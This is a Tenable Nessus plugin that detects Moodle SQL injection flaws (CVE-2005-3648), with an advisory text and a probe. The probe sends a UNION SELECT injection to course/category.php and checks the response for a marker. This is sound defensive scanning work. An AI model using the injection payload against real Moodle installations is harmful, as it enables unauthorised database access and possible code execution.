#
# (C) Tenable Network Security
#


if (description) {
  script_id(20210);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2005-3648");
  script_bugtraq_id(15380);
  script_xref(name:"OSVDB", value:"20748");

  script_name(english:"Moodle < 1.5.3 Multiple SQL Injection Vulnerabilities");
  script_summary(english:"Checks for multiple SQL vulnerabilities in Moodle < 1.5.3");
 
  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple SQL injection issues. 

Description :

The remote installation of Moodle fails to sanitize user-supplied
input to the id' parameter of 'course/category.php' and
'course/info.php' scripts as well as the 'user' parameter of
'iplookup/ipatlas/plot.php' script before using it in database
queries.  An attacker may be able to exploit these issues to launch
SQL injection attacks against the affected application, possibly
levering them to run arbitrary PHP code on the remote host, subject to
the permissions of the web server user id. 

See also :

http://retrogod.altervista.org/moodle16dev.html
http://security.moodle.org/mod/forum/discuss.php?d=186

Solution :

Upgrade to Moodle 1.5.3 or later when it becomes available or enable
PHP's 'magic_quotes_gpc' setting and disable its 'register_globals'
setting. 

Risk factor :

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";
  script_description(english:desc);
 
  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("moodle_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/moodle"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to exploit one of the SQL injection flaws.
  # 
  # nb: this should cause Moodle to display our script name as a course.
  sql = string("UNION SELECT 0,'", SCRIPT_NAME, "',0,0,0,0,1,0/*");
  req = http_get(
    item:string(
      dir, "/course/category.php?",
      "id=", urlencode(str:string("' ", sql))
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if we see our script name as a course.
  if (string("</a> &raquo; ", SCRIPT_NAME, "</div>") >< res) {
    security_warning(port);
    exit(0);
  }
}
